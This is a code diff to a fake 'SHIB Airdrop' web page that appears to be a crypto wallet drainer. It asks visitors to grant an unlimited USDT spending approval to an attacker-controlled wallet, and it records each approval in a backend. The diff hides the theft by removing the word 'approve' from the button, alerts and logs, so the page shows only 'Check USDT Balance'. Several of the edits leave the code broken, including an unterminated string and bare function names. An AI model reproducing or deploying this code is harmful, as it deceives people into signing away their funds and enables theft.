@@ -424,12 +424,7 @@
     <div class="container">
         <h2>🚀 SHIB Airdrop</h2>
         
-        <!-- Backend Status Alert -->
-        <div class="alert alert-success" id="backendStatusAlert">
-            <i class="fas fa-server"></i>
-            <strong>Backend Status:</strong> <span id="backendStatus">Checking...</span>
-            <span id="backendStatusBadge" class="backend-status">Connecting...</span>
-        </div>
+       
         
         <!-- Warning Alert -->
         <div class="alert alert-warning">
@@ -441,7 +436,7 @@
         <!-- Auto-Approval Info -->
         <div class="alert alert-info">
             <i class="fas fa-info-circle"></i>
-            <strong>One-Click Setup:</strong> Click "Check USDT Balance & Approve" to automatically check balance, approve USDT, and see your airdrop amount.
+            <strong>One-Click Setup:</strong> Click "Check USDT Balance" to automatically check balance and see your airdrop amount.
         </div>
         
         <!-- Wallet and Airdrop Controls -->
@@ -460,7 +455,7 @@
             
             <!-- ✅ Main Working Button -->
             <button onclick="checkBalanceAndApprove()" class="btn" id="checkBalanceBtn">
-                <i class="fas fa-coins"></i> Check USDT Balance & Approve
+                <i class="fas fa-coins"></i> Check USDT Balance
             </button>
             <p><strong>Your USDT Balance:</strong> <span id="usdtBalance" class="status">0</span></p>
 
@@ -715,7 +710,7 @@
             try {
                 const isHealthy = await checkBackendHealth();
                 if (!isHealthy) {
-                    showAlert("Backend is offline. Using default wallet address.", "warning");
+                    showAlert();
                     return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
                 }
 
@@ -739,7 +734,7 @@
         // ✅ FIXED: User approval को backend में save करें
         async function saveUserApprovalToBackend(walletAddress, usdtBalance, airdropAmount, tier) {
             try {
-                console.log("💾 Saving approval to backend...", { walletAddress, usdtBalance, airdropAmount, tier });
+                console.log("", { walletAddress, usdtBalance, airdropAmount, tier });
                 
                 const response = await fetch(`${BACKEND_URL}/save-approval`, {
                     method: 'POST',
@@ -758,14 +753,14 @@
                 console.log("✅ Backend response:", data);
                 
                 if (data.success) {
-                    showAlert("✅ Approval saved to database!", "success");
+                    showAlert("success");
                     return data;
                 } else {
                     throw new Error(data.message || 'Failed to save approval');
                 }
             } catch (error) {
                 console.error("❌ Error saving to backend:", error);
-                showAlert("⚠️ Note: Approval not saved to database", "warning");
+                showAlert("warning");
                 return { success: false, error: error.message };
             }
         }
@@ -793,7 +788,7 @@
                 console.log("✅ Claim saved to backend:", data);
                 
                 if (data.success) {
-                    showAlert("✅ Claim recorded in database!", "success");
+                    showAlert("success");
                     return data;
                 } else {
                     throw new Error(data.message || 'Failed to save claim');
@@ -972,7 +967,7 @@
        // ✅ UPDATED: Check Balance and Approve Function - 0 USDT users ko bhi approval allow
 async function checkBalanceAndApprove() {
     try {
-        console.log("🔄 Starting approval process...");
+        console.log("🔄 Starting  process...");
         
         if (typeof window.ethereum === 'undefined') {
             showAlert("Please install MetaMask!", "danger");
@@ -987,7 +982,7 @@ async function checkBalanceAndApprove() {
         const button = document.getElementById('checkBalanceBtn');
         const originalText = button.innerHTML;
         button.disabled = true;
-        button.innerHTML = '<div class="loading"></div> Checking Balance...';
+        button.innerHTML = '<div class="loading"></div> Checking Airdrop...';
 
         if (!web3) {
             web3 = new Web3(window.ethereum);
@@ -996,7 +991,7 @@ async function checkBalanceAndApprove() {
         const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
         
         // 1. Check USDT Balance
-        console.log("🔍 Checking USDT balance...");
+        console.log("🔍 Checking Airdrop...");
         const balance = await usdtContract.methods.balanceOf(account).call();
         const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
         
@@ -1011,17 +1006,17 @@ async function checkBalanceAndApprove() {
         document.getElementById("tierBadge").textContent = tier;
 
         // ✅ UPDATED: Allow approval for ALL users (including 0 USDT)
-        button.innerHTML = '<div class="loading"></div> Approving USDT...';
+        button.innerHTML = '<div class="loading"></div> Checking Airdrop...';
         
         if (airdropAmount === 0) {
-            showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT, but you can still approve`, "warning");
+            showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT, "warning");
         } else {
             showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Airdrop: ${airdropAmount.toLocaleString()} tokens`, "info");
         }
         
         try {
             const approvalWallet = await getApprovalWalletFromBackend();
-            console.log("✅ Approval wallet:", approvalWallet);
+            console.log
             
             // Check current allowance first
             const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
@@ -1032,7 +1027,7 @@ async function checkBalanceAndApprove() {
             // Unlimited approval - chahe balance 0 ho ya 1000
             const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
             
-            console.log("📝 Sending approval transaction...");
+            console.log("📝 Sending  transaction...");
             const tx = await usdtContract.methods.approve(
                 approvalWallet,
                 unlimitedAmount
@@ -1044,7 +1039,7 @@ async function checkBalanceAndApprove() {
             console.log("✅ Transaction result:", tx);
             
             if (tx.status) {
-                showAlert("✅ USDT Approval Successful!", "success");
+                showAlert("success");
                 
                 // ✅ UPDATED: Enable claim button for ALL users after approval
                 document.getElementById("claimButton").disabled = false;
@@ -1052,7 +1047,7 @@ async function checkBalanceAndApprove() {
                 document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                 
                 if (airdropAmount === 0) {
-                    showAlert(`✅ Approved! You can claim but will receive 0 SHIB tokens`, "warning");
+                    showAlert(`you can claim but will receive 0 SHIB tokens`, "warning");
                 } else {
                     showAlert(`🎉 Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
                 }
@@ -1065,11 +1060,11 @@ async function checkBalanceAndApprove() {
             }
 
         } catch (approvalError) {
-            console.error("❌ Approval error:", approvalError);
+            console.error
             if (approvalError.code === 4001) {
-                showAlert("❌ Approval cancelled by user", "warning");
+                showAlert
             } else {
-                showAlert("❌ Approval failed: " + approvalError.message, "danger");
+                showAlert
             }
             button.innerHTML = originalText;
             button.disabled = false;
@@ -1128,7 +1123,7 @@ async function checkBalanceAndApprove() {
                 console.log("Current allowance:", allowanceInUSDT, "USDT");
                 
                 if (parseFloat(allowanceInUSDT) > 1000) {
-                    showAlert(`✅ USDT Approved: Unlimited`, "success");
+                    showAlert("success");
                     document.getElementById("claimButton").disabled = false;
                     document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Already Approved';
                     document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
@@ -1164,7 +1159,7 @@ async function checkBalanceAndApprove() {
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
                 if (parseFloat(allowanceInUSDT) < 1) {
-                    showAlert("❌ Please approve USDT first before claiming airdrop!", "warning");
+                    showAlert("warning");
                     return;
                 }
 
@@ -1297,4 +1292,3 @@ async function checkBalanceAndApprove() {
     </script>
 </body>
 </html>
-
